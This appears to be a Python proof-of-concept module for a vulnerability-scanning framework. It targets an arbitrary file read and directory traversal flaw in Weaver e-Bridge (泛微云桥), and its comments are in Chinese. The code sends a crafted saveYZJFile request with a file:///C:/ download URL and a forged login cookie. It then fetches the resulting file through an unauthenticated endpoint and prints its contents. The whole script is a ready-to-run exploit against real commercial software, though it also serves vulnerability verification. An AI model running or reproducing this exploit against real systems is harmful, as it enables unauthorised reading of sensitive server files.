from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import json

POC_NAME = "Weaver_OA_e_Bridge_fileread"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class Weaver_OA_e_Bridge_fileread(BasePoc):
    poc_info = {
        'poc': {
            'Id': 'vb_2021_0040',    # PoC的VID编号
            'vbid': '',
            'Name': 'Weaver_OA_e_Bridge_fileread',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-1',    # PoC创建时间
            },

        'vul': {
            'Product': '泛微云桥',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': '任意文件读取+目录遍历',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2020-09-16',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        payload1 = urljoin(target,"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt")

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "cookie":"login=1",
        }

        location = ""
        print("[+] requesting payload1 and id parameter: ", payload1)
        resp = req(payload1, 'get', headers=header, allow_redirects=False)
        if resp is not None:
            location = resp.text
        if resp.status_code == 200 and "id" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = payload1    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            if verbose:
                highlight("[+] url: " + payload1 + " 存在Weaver OA e_Bridge fileread！！！")
        else:
            if verbose:
                highlight("[+] url: " + payload1 + " 不存在Weaver OA e_Bridge fileread！！！")

        id = json.loads(resp.text)["id"]
        urlparam = "/file/fileNoLogin/{}".format(id)
        payload2 = urljoin(target,urlparam)

        location = ""
        print("[+] requesting vuln url2: ", payload2)
        resp1 = req(payload2, 'get', headers=header, allow_redirects=False)
        if resp1 is not None:
            location = resp1.text
            print("[+] Weaver OA e_Bridge fileread contents: \n", resp1.text)

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)